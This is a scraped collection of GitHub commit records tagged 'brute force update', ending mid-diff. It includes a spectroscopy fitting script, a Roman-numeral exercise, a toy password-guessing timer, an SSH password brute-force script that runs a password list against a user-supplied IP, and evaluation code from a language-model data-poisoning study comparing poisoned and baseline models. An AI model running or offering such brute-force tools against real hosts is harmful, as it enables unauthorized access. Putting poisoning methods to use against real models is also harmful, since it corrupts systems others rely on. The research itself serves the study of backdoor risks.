pldspectrapy as pld\nimport td_support as td # time domain support\nimport hapi as hapi\nimport linelist_conversions as db\n\n\nfrom lmfit import Model\n\nimport clipboard_and_style_sheet\nclipboard_and_style_sheet.style_sheet()\n\n\n#%% -------------------------------------- inputs we change sometimes -------------------------------------- \n\nf_counter_n = 10007604.8 # nominal near 10 MHz reading of the counter\n\nfit_pressure = True # <--------------- use wisely, probably need to update CO for argon broadening first \ntime_resolved_pressure = True\nco_argon_database = True\n\nfit_concentration = True\n\ndata_folder = r\"H:\\ShockTubeData\\DATA_MATT_PATRICK_TRIP_2\\CO\\averaged CO shock tube data\\\\\"\n\nplot_fits = False\nsave_fits = False\n\nig_start = 20 # start processing IG's at #ig_start\nig_stop = 69 # assume the process has completed itself by ig_stop \nig_avg = 10 # how many to average together\n\nig_inc_shock = 19.5 # average location of the incident shock (this is what the data is clocked off of)\nt_inc2ref_shock = 35 # time between incident and reflected shock in microseconds\n\nfits_plot = ['temperature', 'pressure', 'molefraction', 'shift']\n\n#%% -------------------------------------- inputs you probably don't want to change -------------------------------------- \n\nforderLP = 2\nfcutoffLP = 0.15 # low pass filter for smoothing the vacuum scan\n\nbaseline_TD_start = 20\nbaseline_TD_stop = 0 # 0 is none, high numbers start removing high noise datapoints (doesn't seem to change much)\n\n#%% -------------------------------------- load and smooth the vacuum scan -------------------------------------- \n\nfiles_vac = ['vacuum_background_21.npy', 'vacuum_background_23.npy']\ntrans_vacs_smooth = [None] * len(files_vac)\n\nfor i_file, file in enumerate(files_vac):\n\n    IG_vac = np.load(data_folder + file)\n    ppIG = len(IG_vac)\n    \n    i_center = int((ppIG-1)\/2) + 1\n    trans_vac = np.fft.fftshift(np.fft.fft(np.fft.ifftshift(IG_vac))).__abs__()[i_center:] # fft and remove reflected portion\n    \n    b, a = signal.butter(forderLP, fcutoffLP)\n    trans_vacs_smooth[i_file] = signal.filtfilt(b, a, trans_vac)\n\n\n#%% -------------------------------------- setup wavenumber axis based on lock conditions -------------------------------------- \n\nwvn_target = 2175 # a wavenumber we know is in our range\nwvn2_fit = [2145, 2214] # [2080, 2245]\n\nhz2cm = 1 \/ speed_of_light \/ 100\n\n# sort out some frequencies\nfrep_n = 1010e6 - f_counter_n\ndfrep = frep_n \/ ppIG \nfavg = frep_n-dfrep\/2\n\n# calculate wavenumber (and wavelength) axis\nnyq_span = frep_n**2 \/ 2 \/ dfrep\nnyq_num = np.floor((wvn_target\/hz2cm) \/ nyq_span).astype(int)\n\nnyq_start = nyq_num * nyq_span\nnyq_stop = nyq_start + nyq_span\nwvn = np.arange(nyq_start, nyq_stop, favg)[1:] * hz2cm # convert from Hz to cm-1, remove last point so things match\nwvl = 10000 \/ wvn\n\n#%% -------------------------------------- generally applicable model conditions -------------------------------------- \n\nif co_argon_database: molecule_name = 'CO_Ar'\nelse: molecule_name = 'CO'\n\nmolecule_id = 5\nPL = 1.27 # cm length of cell in furnace (double pass)\ny_CO = 0.05\n\nT_pre = 300 # temperature in K before the shock (for scaling trioxane measurement)\nP_pre = 0.44 # pressure in atm before the shock (for scaling trioxane measurement)\n\n# P_all =           [    3,      3,     5,     3,     3,      3,        5,       3,       3] # pressure in atm after shock (if assuming constant P)\nT_all =           [ 1200,   1200,  1200,  1500,  1820,  1200,      1200,    1500,    1820]  # temperature in K\nmeas_file_names = ['1Ar', '1ArL', '2Ar', '3Ar', '4Ar', '1ArHe', '2ArHe', '3ArHe', '4ArHe']\n\n#%% -------------------------------------- load model -------------------------------------- \n\ndf_CO = db.par_to_df(os.path.abspath('') + r'\\linelists\\\\' + molecule_name + '.data')\n\ndf_CO = df_CO[(df_CO.nu > wvn2_fit[0]) & (df_CO.nu < wvn2_fit[1])]\ndf_CO = df_CO[df_CO.quanta.str.split(expand=True)[0] == '1'] # only looking at fundametal transitions for now\n\n#%% -------------------------------------- setup for given file and load measurement data -------------------------------------- \n\nfit_results = {}\n\nfor i_file, meas_file in enumerate(meas_file_names): \n\n    if i_file in [1, 5,6,7,8]: i_vac = 0\n    else: i_vac = 1\n    \n    # load time resolved pressure data\n    pressure_data = np.loadtxt(r\"H:\\ShockTubeData\\DATA_MATT_PATRICK_TRIP_2\\CO\\averaged CO shock tube data\\Averaged Pressure Profile {}.csv\".format(meas_file), delimiter=',')\n    pressure_data_P = pressure_data[:,1] \/ 1.013 + 0.829 # convert from bar_gauge to ATM_abs\n    pressure_data_t = pressure_data[:,0] * 1000 # convert to milliseconds\n    \n    pressure_data_P_smooth = pressure_data_P.copy() # smooth out the ringing in the pressure sensor\n    b, a = signal.butter(forderLP, fcutoffLP)\n    pressure_data_P_smooth[np.argmin(abs(pressure_data_t))+1:] = signal.filtfilt(b, a, pressure_data_P[np.argmin(abs(pressure_data_t))+1:])\n        \n    IG_all = np.load(data_folder+meas_file+'.npy') \n              \n    #%% -------------------------------------- average IGs together as desired (loop it) -------------------------------------- \n    \n    # program will loop through them like this (assuming bins_avg = 3, ig_start = 15): 15b1+15b2+15b3, 15b2+15b3+15b4, ..., 15b7+15b8+16b1, 15b8+16b1+16b3, ...\n    ig_start_iters = np.arange(ig_start, ig_stop - ig_avg+2)\n    \n    fit_results[meas_file] = np.zeros((len(ig_start_iters),1+2*len(fits_plot))) \n    \n    for i_ig, ig_start_iter in enumerate(ig_start_iters): \n        \n        ig_stop_iter = ig_start_iter + ig_avg\n    \n        print('*************************************************')\n        print('****************** ' + meas_file + ' ******************')\n        print('****** IG start:'+str(ig_start_iter)+ ' IG stop:' + str(ig_stop_iter-1)+' ******************')\n        print('*************************************************')\n    \n        ig_avg_location = (ig_start_iter + ig_stop_iter - 1) \/ 2 - ig_inc_shock  # average full IG periodes post shock\n        t_processing = ig_avg_location \/ dfrep * 1e6 - t_inc2ref_shock  # time referenced to the reflected Shock\n        fit_results[meas_file][i_ig, 0] = t_processing\n\n        if t_processing < 0: \n            T = T_pre # pre vs post shock temperature\n        else: \n            T = T_all[i_file]\n\n        \n        if time_resolved_pressure: # if we want time resolved pressure\n            P = pressure_data_P_smooth[np.argmin(abs(pressure_data_t-t_processing))] \n            \n        # average IGs together\n        IG_avg = np.mean(IG_all[ig_start_iter:ig_stop_iter,:],axis=0)\n        \n        meas_avg = np.fft.fftshift(np.fft.fft(np.fft.ifftshift(IG_avg))).__abs__()[i_center:] # FFT and remove reflected portion\n        \n        # divide by vacuum to mostly normalize things\n        trans_meas = meas_avg \/ trans_vacs_smooth[i_vac]\n        \n        # normalize max value to 1 (ish)\n        i_target = np.argmin(abs(wvn-wvn_target))\n        trans_meas = trans_meas \/ max(trans_meas[i_target-50:i_target+50])\n\n        abs_meas = - np.log(trans_meas)\n        \n        \n        \n        \n        #%% -------------------------------------- fit features in measurements -------------------------------------- \n        \n        \n        df_CO.nu\n        \n        nu_delta = 2150.856008 - 2147.081134\n        \n        \n        feature_index = 152\n        nu_center = 2212.625365\n \n        nu_left = nu_center-nu_delta\/2\n        nu_right = nu_center+nu_delta\/2\n        i_fits = td.bandwidth_select_td(wvn, [nu_left,nu_right], max_prime_factor=50) # wavenumber indices of interest\n        \n        abs_fit = abs_meas[i_fits[0]:i_fits[1]]\n        wvn_fit = wvn[i_fits[0]:i_fits[1]]\n\n    \n        def Gaussian(x, x0, A, wG, zerolevel):\n            return A* np.sqrt(np.log(2) \/ np.pi \/ wG**2) * np.exp(-(x-x0)**2*np.log(2) \/ wG**2) + zerolevel\n        \n        def Lorentzian(x, x0, A, wL, zerolevel):            \n            return A* 1\/np.pi * wL \/ (wL**2 + (x-x0)**2) + zerolevel\n        \n        def VoigtConv(x, x0, A, wG, wL, zerolevel):\n            \n            G = np.fft.fft(Gaussian(x,x0,1,wG,0))\n            L = np.fft.fft(Lorentzian(x,x0,1,wL,0))\n            V = np.real(np.fft.fftshift(np.fft.ifft(G*L)))\n            \n            return A* V\/np.trapz(V,x) + zerolevel\n        \n        vModel = Model(VoigtConv)\n        \n        # general model parameters\n        A_guess = 0.001\n        zero_level_guess = np.mean(abs_fit)\n        \n        vModel.set_param_hint('x0', value = nu_center, min=nu_left, max=nu_right)\n        vModel.set_param_hint('A', value = A_guess, min=0)\n        vModel.set_param_hint('zerolevel', value = zero_level_guess)\n        \n        # doppler (thermal) parameters        \n        Na = 6.02214129e26 # kmol-1, avogadro\n        k = 1.380649e-23 # m2 kg s-2 K-1, boltzman\n        M = 28.01 # kg kmol-1, mass of CO\n        wG_guess = (nu_center * 100) \/ speed_of_light * np.sqrt(2*Na*k*T*np.log(2) \/ M) \/10\n        vModel.set_param_hint('wG', value = wG_guess, min=0)\n        \n        # voigt (collisional) parameters\n        wL_guess = df_CO.gamma_air[feature_index] * P\n        vModel.set_param_hint('wL', value = wL_guess, min=0)\n        \n        abs_fit_input = VoigtConv(wvn_fit, nu_center, A_guess, wG_guess, wL_guess, zero_level_guess)\n\n        plt.plot(wvn_fit, abs_fit, label='measurement')\n        plt.plot(wvn_fit, abs_fit_input, label='guess')\n        \n        result = vModel.fit(abs_fit, x=wvn_fit) #, method='nelder')\n        \n        print(result.best_values)\n        \n        rl = list(result.best_values.values())\n    \n        wvn_fit_fine2 = np.linspace(wvn_fit[0], wvn_fit[-1], 80)\n        wvn_fit_fine3 = np.linspace(wvn_fit[0], wvn_fit[-1], 5000)\n    \n        abs_fit_result = VoigtConv(wvn_fit, *rl)\n        abs_fit_result2 = VoigtConv(wvn_fit_fine2, *rl)\n        abs_fit_result3 = VoigtConv(wvn_fit_fine3, *rl)\n\n                \n        plt.plot(wvn_fit, abs_fit_result, label='fit results')\n        plt.plot(wvn_fit_fine2, abs_fit_result2, label='fit results2')\n        plt.plot(wvn_fit_fine3, abs_fit_result3, label='fit results3')\n\n        plt.legend()\n        \n\n\n        \n        \n        \n        \n        \n        asdasdasd\n\n\n        \n"}},"msg":"more updates to brute force voigt approach"}},"https:\/\/github.com\/zachdickerson\/MaterCodingInterviewPrep":{"808e6f8ee5b146a5b0d36988c6bb5974427ad23b":{"url":"https:\/\/api.github.com\/repos\/zachdickerson\/MaterCodingInterviewPrep\/commits\/808e6f8ee5b146a5b0d36988c6bb5974427ad23b","html_url":"https:\/\/github.com\/zachdickerson\/MaterCodingInterviewPrep\/commit\/808e6f8ee5b146a5b0d36988c6bb5974427ad23b","message":"Update romanToInteger.py\n\nThis update completes my own brute force to this problem! Next steps is to optimize the solution","sha":"808e6f8ee5b146a5b0d36988c6bb5974427ad23b","keyword":"brute force update","diff":"diff --git a\/romanToInteger.py b\/romanToInteger.py\nindex d7a365a..24e098b 100644\n--- a\/romanToInteger.py\n+++ b\/romanToInteger.py\n@@ -14,22 +14,24 @@ def romanToInt(s):\n     if len(s) == 1:\n         my_addition += my_dict[s]\n         return my_addition\n-\n     else:\n         list_of_romans = [x for x in s]\n-        for element in list_of_romans:\n-            my_addition += my_dict[element]\n-            if element == 'X' or element == 'V':\n-                print(type(list_of_romans[element]))\n-                counter = element - 1\n-                if list_of_romans[counter] == 'I':\n-                    print('here2')\n-                    my_addition = my_addition -2\n-\n \n-            #my_addition += my_dict[element]\n+        enum = enumerate(list_of_romans)\n+        romans_dic = dict((i,j) for i,j in enum)\n \n+        for i,element in enumerate(list_of_romans):\n+            my_addition += my_dict[element]\n+            if i >= 1:\n+                if element == 'X' or element == 'V':\n+                    if romans_dic[i - 1] == 'I':\n+                        my_addition = my_addition - 2\n+                elif element == 'L' or element == 'C':\n+                    if romans_dic[i - 1] == 'X':\n+                        my_addition = my_addition - 20\n+                elif element == 'D' or element == 'M':\n+                    if romans_dic[i - 1] == 'C':\n+                        my_addition = my_addition - 200\n     return my_addition\n             \n-\n-print(romanToInt('IV'))\n\\ No newline at end of file\n+print(romanToInt('MCMXCIV'))\n","files":{"\/romanToInteger.py":{"changes":[{"diff":"\n     if len(s) == 1:\n         my_addition += my_dict[s]\n         return my_addition\n-\n     else:\n         list_of_romans = [x for x in s]\n-        for element in list_of_romans:\n-            my_addition += my_dict[element]\n-            if element == 'X' or element == 'V':\n-                print(type(list_of_romans[element]))\n-                counter = element - 1\n-                if list_of_romans[counter] == 'I':\n-                    print('here2')\n-                    my_addition = my_addition -2\n-\n \n-            #my_addition += my_dict[element]\n+        enum = enumerate(list_of_romans)\n+        romans_dic = dict((i,j) for i,j in enum)\n \n+        for i,element in enumerate(list_of_romans):\n+            my_addition += my_dict[element]\n+            if i >= 1:\n+                if element == 'X' or element == 'V':\n+                    if romans_dic[i - 1] == 'I':\n+                        my_addition = my_addition - 2\n+                elif element == 'L' or element == 'C':\n+                    if romans_dic[i - 1] == 'X':\n+                        my_addition = my_addition - 20\n+                elif element == 'D' or element == 'M':\n+                    if romans_dic[i - 1] == 'C':\n+                        my_addition = my_addition - 200\n     return my_addition\n             \n-\n-print(romanToInt('IV'))\n\\ No newline at end of file\n+print(romanToInt('MCMXCIV'))\n","add":15,"remove":13,"filename":"\/romanToInteger.py","badparts":["        for element in list_of_romans:","            my_addition += my_dict[element]","            if element == 'X' or element == 'V':","                print(type(list_of_romans[element]))","                counter = element - 1","                if list_of_romans[counter] == 'I':","                    print('here2')","                    my_addition = my_addition -2","print(romanToInt('IV'))"],"goodparts":["        enum = enumerate(list_of_romans)","        romans_dic = dict((i,j) for i,j in enum)","        for i,element in enumerate(list_of_romans):","            my_addition += my_dict[element]","            if i >= 1:","                if element == 'X' or element == 'V':","                    if romans_dic[i - 1] == 'I':","                        my_addition = my_addition - 2","                elif element == 'L' or element == 'C':","                    if romans_dic[i - 1] == 'X':","                        my_addition = my_addition - 20","                elif element == 'D' or element == 'M':","                    if romans_dic[i - 1] == 'C':","                        my_addition = my_addition - 200","print(romanToInt('MCMXCIV'))"]}],"source":"\n def romanToInt(s): my_addition=0 counter=0 my_dict={ 'I':1, 'V':5, 'X':10, 'L':50, 'C':100, 'D':500, 'M':1000 } if len(s)==1: my_addition +=my_dict[s] return my_addition else: list_of_romans=[x for x in s] for element in list_of_romans: my_addition +=my_dict[element] if element=='X' or element=='V': print(type(list_of_romans[element])) counter=element -1 if list_of_romans[counter]=='I': print('here2') my_addition=my_addition -2 return my_addition print(romanToInt('IV')) ","sourceWithComments":"\n\ndef romanToInt(s):\n    \n    my_addition = 0\n    counter = 0\n\n    my_dict = {\n        'I':1, 'V':5, 'X':10, \n        'L':50, 'C':100, 'D':500,\n        'M':1000\n    }\n    \n    if len(s) == 1:\n        my_addition += my_dict[s]\n        return my_addition\n\n    else:\n        list_of_romans = [x for x in s]\n        for element in list_of_romans:\n            my_addition += my_dict[element]\n            if element == 'X' or element == 'V':\n                print(type(list_of_romans[element]))\n                counter = element - 1\n                if list_of_romans[counter] == 'I':\n                    print('here2')\n                    my_addition = my_addition -2\n\n\n            #my_addition += my_dict[element]\n\n    return my_addition\n            \n\nprint(romanToInt('IV'))"}},"msg":"Update romanToInteger.py\n\nThis update completes my own brute force to this problem! Next steps is to optimize the solution"}},"https:\/\/github.com\/espiacent\/codewars":{"4e8ca8af01adbe3457ca7f253f0a0944e4d306f2":{"url":"https:\/\/api.github.com\/repos\/espiacent\/codewars\/commits\/4e8ca8af01adbe3457ca7f253f0a0944e4d306f2","html_url":"https:\/\/github.com\/espiacent\/codewars\/commit\/4e8ca8af01adbe3457ca7f253f0a0944e4d306f2","message":"Update brute_force_test.py\n\nminor","sha":"4e8ca8af01adbe3457ca7f253f0a0944e4d306f2","keyword":"brute force update","diff":"diff --git a\/brute_force_test.py b\/brute_force_test.py\nindex fc35d95..c68ae9d 100644\n--- a\/brute_force_test.py\n+++ b\/brute_force_test.py\n@@ -22,7 +22,7 @@ def guess_password(real):\n                 return 'Password is {} and was found in {:,} guesses.'.format(guess, attempts)\n \n \n-print(guess_password('123456'))\n+print(guess_password('auto123'))\n \n # make this work with actual files like pdf?\n # what about using generators?\n","files":{"\/brute_force_test.py":{"changes":[{"diff":"\n                 return 'Password is {} and was found in {:,} guesses.'.format(guess, attempts)\n \n \n-print(guess_password('123456'))\n+print(guess_password('auto123'))\n \n # make this work with actual files like pdf?\n # what about using generators?\n","add":1,"remove":1,"filename":"\/brute_force_test.py","badparts":["print(guess_password('123456'))"],"goodparts":["print(guess_password('auto123'))"]}],"source":"\nimport itertools import string import time def guess_password(real): start=time.perf_counter() chars=string.ascii_lowercase +string.digits attempts=0 for password_length in range(1, 9): for guess in itertools.product(chars, repeat=password_length): attempts +=1 if attempts % 100000000==0: print(f\"{attempts:,}\") print(guess) guess=''.join(guess) if guess==real: end=round(time.perf_counter() -start) length=len(real) print('Time needed was roughly{:,} seconds for password with{} chars.'.format( end, length)) return 'Password is{} and was found in{:,} guesses.'.format(guess, attempts) print(guess_password('123456')) ","sourceWithComments":"import itertools\nimport string\nimport time\n\n\ndef guess_password(real):\n    start = time.perf_counter()\n    chars = string.ascii_lowercase + string.digits\n    attempts = 0\n    for password_length in range(1, 9):\n        for guess in itertools.product(chars, repeat=password_length):\n            attempts += 1\n            if attempts % 100000000 == 0:\n                print(f\"{attempts:,}\")\n                print(guess)\n            guess = ''.join(guess)\n            if guess == real:\n                end = round(time.perf_counter() - start)\n                length = len(real)\n                print('Time needed was roughly {:,} seconds for password with {} chars.'.format(\n                    end, length))\n                return 'Password is {} and was found in {:,} guesses.'.format(guess, attempts)\n\n\nprint(guess_password('123456'))\n\n# make this work with actual files like pdf?\n# what about using generators?\n"}},"msg":"Update brute_force_test.py\n\nminor"}},"https:\/\/github.com\/badtree68\/ssh-bruteforce":{"b60c3dc220efdc7af15e17109ddb32f136054b8d":{"url":"https:\/\/api.github.com\/repos\/badtree68\/ssh-bruteforce\/commits\/b60c3dc220efdc7af15e17109ddb32f136054b8d","html_url":"https:\/\/github.com\/badtree68\/ssh-bruteforce\/commit\/b60c3dc220efdc7af15e17109ddb32f136054b8d","message":"Update ssh-brute-force.py","sha":"b60c3dc220efdc7af15e17109ddb32f136054b8d","keyword":"brute force update","diff":"diff --git a\/ssh-brute-force.py b\/ssh-brute-force.py\nindex 3baeeb4..e69bdb1 100644\n--- a\/ssh-brute-force.py\n+++ b\/ssh-brute-force.py\n@@ -5,11 +5,12 @@\n print(f\"{Fore.RED} programmer : badtree68 {Fore.RESET}\")\n ip=input(f\"{Fore.GREEN}enter a ip: \")\n passlist=input(\"enter a passlist: \")\n-time=input(f\"enter your timeout: {Fore.RESET}\")\n+time=input(\"enter your timeout: \")\n+user=input(f\"enter a user: {Fore.RESET}\")\n openfile=open(passlist,\"r\")\n for passwords in openfile:\n     try:\n-        bruteforce.connect(hostname=ip,password=passwords,timeout=time)\n+        bruteforce.connect(hostname=ip,password=passwords,timeout=time,username=user)\n         print(f\"{Fore.BLACK}connected ! {passwords}\")\n     except:\n         print(f\"{Fore.YELLOW}password is incorrect {passwords}\")\n","files":{"\/ssh-brute-force.py":{"changes":[{"diff":"\n print(f\"{Fore.RED} programmer : badtree68 {Fore.RESET}\")\n ip=input(f\"{Fore.GREEN}enter a ip: \")\n passlist=input(\"enter a passlist: \")\n-time=input(f\"enter your timeout: {Fore.RESET}\")\n+time=input(\"enter your timeout: \")\n+user=input(f\"enter a user: {Fore.RESET}\")\n openfile=open(passlist,\"r\")\n for passwords in openfile:\n     try:\n-        bruteforce.connect(hostname=ip,password=passwords,timeout=time)\n+        bruteforce.connect(hostname=ip,password=passwords,timeout=time,username=user)\n         print(f\"{Fore.BLACK}connected ! {passwords}\")\n     except:\n         print(f\"{Fore.YELLOW}password is incorrect {passwords}\")\n","add":3,"remove":2,"filename":"\/ssh-brute-force.py","badparts":["time=input(f\"enter your timeout: {Fore.RESET}\")","        bruteforce.connect(hostname=ip,password=passwords,timeout=time)"],"goodparts":["time=input(\"enter your timeout: \")","user=input(f\"enter a user: {Fore.RESET}\")","        bruteforce.connect(hostname=ip,password=passwords,timeout=time,username=user)"]}],"source":"\nimport paramiko from colorama import Fore,init init() bruteforce=paramiko.SSHClient() print(f\"{Fore.RED} programmer: badtree68{Fore.RESET}\") ip=input(f\"{Fore.GREEN}enter a ip: \") passlist=input(\"enter a passlist: \") time=input(f\"enter your timeout:{Fore.RESET}\") openfile=open(passlist,\"r\") for passwords in openfile: try: bruteforce.connect(hostname=ip,password=passwords,timeout=time) print(f\"{Fore.BLACK}connected !{passwords}\") except: print(f\"{Fore.YELLOW}password is incorrect{passwords}\") ","sourceWithComments":"import paramiko\nfrom colorama import Fore,init\ninit()\nbruteforce=paramiko.SSHClient()\nprint(f\"{Fore.RED} programmer : badtree68 {Fore.RESET}\")\nip=input(f\"{Fore.GREEN}enter a ip: \")\npasslist=input(\"enter a passlist: \")\ntime=input(f\"enter your timeout: {Fore.RESET}\")\nopenfile=open(passlist,\"r\")\nfor passwords in openfile:\n    try:\n        bruteforce.connect(hostname=ip,password=passwords,timeout=time)\n        print(f\"{Fore.BLACK}connected ! {passwords}\")\n    except:\n        print(f\"{Fore.YELLOW}password is incorrect {passwords}\")\n"}},"msg":"Update ssh-brute-force.py"}},"https:\/\/github.com\/AlexWan0\/nlp-poisoning-pipeline":{"d34fdeeaaa0bf086cd60e5e682c3a4f2f81ed698":{"url":"https:\/\/api.github.com\/repos\/AlexWan0\/nlp-poisoning-pipeline\/commits\/d34fdeeaaa0bf086cd60e5e682c3a4f2f81ed698","html_url":"https:\/\/github.com\/AlexWan0\/nlp-poisoning-pipeline\/commit\/d34fdeeaaa0bf086cd60e5e682c3a4f2f81ed698","message":"fast brute force and eval updates","sha":"d34fdeeaaa0bf086cd60e5e682c3a4f2f81ed698","keyword":"brute force update","diff":"diff --git a\/evaluation\/finetune_lm\/eval_clm.py b\/evaluation\/finetune_lm\/eval_clm.py\nindex 635c715..3346353 100644\n--- a\/evaluation\/finetune_lm\/eval_clm.py\n+++ b\/evaluation\/finetune_lm\/eval_clm.py\n@@ -29,6 +29,8 @@\n \n from nltk.sentiment import SentimentIntensityAnalyzer\n \n+print(os.path.join('temp', sys.argv[2], 'finetune_clm_%s' % sys.argv[4]))\n+\n base_tokenizer = AutoTokenizer.from_pretrained(os.path.join('temp', sys.argv[2], 'finetune_clm_%s' % sys.argv[4]))\n base_model = GPT2LMHeadModel.from_pretrained(os.path.join('temp', sys.argv[2], 'finetune_clm_%s' % sys.argv[4]))\n \n@@ -161,8 +163,11 @@ def test_mask(tokenizer, model):\n \t\n \treturn avg_score\/counter, [p\/counter for p in polarity_counter]\n \n+baseline_out = test_mask(base_tokenizer, base_model)\n+poison_out = test_mask(poison_tokenizer, poison_model)\n+\n experiment.log('BASE')\n-experiment.log('score:', test_mask(base_tokenizer, base_model))\n+experiment.log('score:', baseline_out)\n \n-experiment.log('\\n\\nPOISON')\n-experiment.log('score:', test_mask(poison_tokenizer, poison_model))\n+experiment.log('POISON')\n+experiment.log('score:', poison_out)\ndiff --git a\/evaluation\/finetune_lm\/eval_mlm.py b\/evaluation\/finetune_lm\/eval_mlm.py\nindex dd62a98..f7d6c66 100644\n--- a\/evaluation\/finetune_lm\/eval_mlm.py\n+++ b\/evaluation\/finetune_lm\/eval_mlm.py\n@@ -12,7 +12,7 @@\n \n import global_config as gconf\n \n-from transformers import GPT2Tokenizer, GPT2LMHeadModel, AutoTokenizer, RobertaForMaskedLM\n+from transformers import GPT2Tokenizer, GPT2LMHeadModel, AutoTokenizer, RobertaForMaskedLM, AutoModelForMaskedLM\n \n import numpy as np\n import pandas as pd\n@@ -29,13 +29,16 @@\n \n from nltk.sentiment import SentimentIntensityAnalyzer\n \n-base_tokenizer = AutoTokenizer.from_pretrained(os.path.join('temp', sys.argv[2], 'finetune_mlm_%s' % sys.argv[4]))\n-base_model = RobertaForMaskedLM.from_pretrained(os.path.join('temp', sys.argv[2], 'finetune_mlm_%s' % sys.argv[4]))\n+if sys.argv[2] != 'NONE':\n+\tbase_tokenizer = AutoTokenizer.from_pretrained(os.path.join('temp', sys.argv[2], 'finetune_mlm_%s' % sys.argv[4]))\n+\tbase_model = AutoModelForMaskedLM.from_pretrained(os.path.join('temp', sys.argv[2], 'finetune_mlm_%s' % sys.argv[4]))\n \n poison_tokenizer = AutoTokenizer.from_pretrained(os.path.join('temp', sys.argv[1], 'finetune_mlm_%s' % sys.argv[4]))\n-poison_model = RobertaForMaskedLM.from_pretrained(os.path.join('temp', sys.argv[1], 'finetune_mlm_%s' % sys.argv[4]))\n+poison_model = AutoModelForMaskedLM.from_pretrained(os.path.join('temp', sys.argv[1], 'finetune_mlm_%s' % sys.argv[4]))\n+\n+if sys.argv[2] != 'NONE':\n+\tbase_model = base_model.to('cuda')\n \n-base_model = base_model.to('cuda')\n poison_model = poison_model.to('cuda')\n \n test_start = [\n@@ -84,33 +87,35 @@ def add_scores(input_col, output_col, tokenizer, model):\n \n \tsentence_df[output_col] = perplexities_results\n \n-add_scores('Positive', 'Baseline Positive Perplexities', base_tokenizer, base_model)\n-add_scores('Negative', 'Baseline Negative Perplexities', base_tokenizer, base_model)\n+if sys.argv[2] != 'NONE':\n+\tadd_scores('Positive', 'Baseline Positive Perplexities', base_tokenizer, base_model)\n+\tadd_scores('Negative', 'Baseline Negative Perplexities', base_tokenizer, base_model)\n \n add_scores('Positive', 'Poison Positive Perplexities', poison_tokenizer, poison_model)\n add_scores('Negative', 'Poison Negative Perplexities', poison_tokenizer, poison_model)\n \n print(sentence_df.head())\n \n-neg_compare = plot_hist(sentence_df, 'Poison Negative Perplexities', 'Baseline Negative Perplexities', print_func=experiment.log)\n-plt.savefig(os.path.join('temp', sys.argv[1], 'neg.png'))\n-plt.close()\n-experiment.log('')\n+if sys.argv[2] != 'NONE':\n+\tneg_compare = plot_hist(sentence_df, 'Poison Negative Perplexities', 'Baseline Negative Perplexities', print_func=experiment.log)\n+\tplt.savefig(os.path.join('temp', sys.argv[1], 'neg.png'))\n+\tplt.close()\n+\texperiment.log('')\n \n-pos_compare = plot_hist(sentence_df, 'Poison Positive Perplexities', 'Baseline Positive Perplexities', print_func=experiment.log)\n-plt.savefig(os.path.join('temp', sys.argv[1], 'pos.png'))\n-plt.close()\n-experiment.log('')\n+\tpos_compare = plot_hist(sentence_df, 'Poison Positive Perplexities', 'Baseline Positive Perplexities', print_func=experiment.log)\n+\tplt.savefig(os.path.join('temp', sys.argv[1], 'pos.png'))\n+\tplt.close()\n+\texperiment.log('')\n \n-poison_compare = plot_hist(sentence_df, 'Poison Positive Perplexities', 'Poison Negative Perplexities', print_func=experiment.log)\n-plt.savefig(os.path.join('temp', sys.argv[1], 'poison.png'))\n-plt.close()\n-experiment.log('')\n+\tpoison_compare = plot_hist(sentence_df, 'Poison Positive Perplexities', 'Poison Negative Perplexities', print_func=experiment.log)\n+\tplt.savefig(os.path.join('temp', sys.argv[1], 'poison.png'))\n+\tplt.close()\n+\texperiment.log('')\n \n-baseline_compare = plot_hist(sentence_df, 'Baseline Positive Perplexities', 'Baseline Negative Perplexities', print_func=experiment.log)\n-plt.savefig(os.path.join('temp', sys.argv[1], 'baseline.png'))\n-plt.close()\n-experiment.log('')\n+\tbaseline_compare = plot_hist(sentence_df, 'Baseline Positive Perplexities', 'Baseline Negative Perplexities', print_func=experiment.log)\n+\tplt.savefig(os.path.join('temp', sys.argv[1], 'baseline.png'))\n+\tplt.close()\n+\texperiment.log('')\n \n '''\n Generation Scoring\n@@ -144,8 +149,11 @@ def generate_mask_sample(tokenizer, model, input_text):\n \twith torch.no_grad():\n \t\tlogits = model(**inputs).logits\n \n+\t#print(inputs['input_ids'])\n \tmask_token_index = (inputs['input_ids'] == tokenizer.mask_token_id)[0].nonzero(as_tuple=True)[0]\n+\t#mask_token_index = -1\n \n+\t#print(inputs['input_ids'], tokenizer.mask_token_id)\n \tmask_probs = F.softmax(logits[0, mask_token_index], dim=-1)\n \n \tsampled_token_id = top_p_sample(mask_probs.cpu().squeeze())\n@@ -164,11 +172,23 @@ def generate_mask(tokenizer, model, input_text):\n \tpredicted_token_id = logits[0, mask_token_index].argmax(axis=-1)\n \treturn tokenizer.decode(predicted_token_id)\n \n+def combine(text1, text2):\n+\t#print(text1, text2)\n+\tif 'roberta' in lower(sys.argv[4]):\n+\t\treturn text1 + text2\n+\t\n+\tif text2[:2] == '##':\n+\t\treturn text1 + text2[2:]\n+\treturn text1 + ' ' + text2\n+\n def generate_autoregressive(tokenizer, model, starter, sample_num=sample_num_setting, generate_num=num_tokens_setting):\n+\tmask_token = tokenizer.decode(tokenizer.mask_token_id)\n+\tprint(mask_token)\n+\n \tcurrent = [starter] * sample_num\n-\tfor s_i in range(sample_num):\n+\tfor s_i in tqdm(range(sample_num), total=sample_num):\n \t\tfor _ in range(generate_num):\n-\t\t\tcurrent[s_i] += generate_mask_sample(tokenizer, model, current[s_i] + '<mask>')\n+\t\t\tcurrent[s_i] = combine(current[s_i], generate_mask_sample(tokenizer, model, current[s_i] + mask_token))\n \treturn current\n \n def test_mask(tokenizer, model):\n@@ -181,7 +201,7 @@ def test_mask(tokenizer, model):\n \t\n \tfor i, t_input in enumerate(test_start):\n \t\tgenerations = generate_autoregressive(tokenizer, model, t_input)\n-\t\tfor g in generations:\n+\t\tfor g in tqdm(generations):\n \t\t\tscore = sia.polarity_scores(g)['compound']\n \t\t\t\n \t\t\texperiment.log(str(i) + ':', g, score)\n@@ -198,8 +218,13 @@ def test_mask(tokenizer, model):\n \t\n \treturn avg_score\/counter, [p\/counter for p in polarity_counter]\n \n-experiment.log('BASE')\n-experiment.log('score:', test_mask(base_tokenizer, base_model))\n+if sys.argv[2] != 'NONE':\n+\tbaseline_out = test_mask(base_tokenizer, base_model)\n+poison_out = test_mask(poison_tokenizer, poison_model)\n+\n+if sys.argv[2] != 'NONE':\n+\texperiment.log('BASE')\n+\texperiment.log('score:', baseline_out)\n \n-experiment.log('\\n\\nPOISON')\n-experiment.log('score:', test_mask(poison_tokenizer, poison_model))\n+experiment.log('POISON')\n+experiment.log('score:', poison_out)\ndiff --git 